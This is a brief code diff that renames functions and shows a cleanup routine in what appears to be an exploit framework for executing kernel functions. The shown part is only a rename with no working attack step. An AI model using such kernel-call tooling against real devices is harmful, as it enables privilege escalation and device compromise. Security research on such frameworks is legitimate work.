     kfunc_args.lr = register_state.lr;
     kfunc_args.sp = register_state.sp;
-    xpl_util_kfunc_execute(util, target_func, &kfunc_args);
+    xpl_kfunc_execute(util, target_func, &kfunc_args);
 }
 
 
-void xpl_util_kfunc_destroy(xpl_util_kfunc_t* util_p) {
-    xpl_util_kfunc_t util = *util_p;
-    xpl_util_kfunc_link0_destroy(&util->link0);
-    xpl_util_kfunc_link1_destroy(&util->link1);
-    xpl_util_kfunc_link2_destroy(&util->link2);
+void xpl_kfunc_destroy(xpl_kfunc_t* util_p) {
+    xpl_kfunc_t util = *util_p;
+    xpl_kfunc_link0_destroy(&util->link0);
+    xpl_kfunc_link1_destroy(&util->link1);
+    xpl_kfunc_link2_destroy(&util->link2);
     free(util);
     *util_p = NULL;
 }
